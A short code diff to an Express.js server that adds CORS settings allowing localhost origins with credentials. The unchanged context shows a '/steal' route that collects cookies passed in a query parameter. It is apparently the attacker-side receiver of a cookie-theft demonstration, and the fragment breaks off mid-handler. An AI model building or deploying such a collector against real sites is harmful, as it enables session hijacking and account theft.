@@ -2,6 +2,15 @@ const express = require("express");
 const app = express();
 const port = 7000;
 
+const cors = require("cors");
+
+app.use(
+  cors({
+    origin: ["http://localhost:3000", "http://localhost:4001"],
+    credentials: true,
+  })
+);
+
 app.get("/steal", (req, res) => {
   const stolenCookie = req.query.cookie;
   if (stolenCookie) {
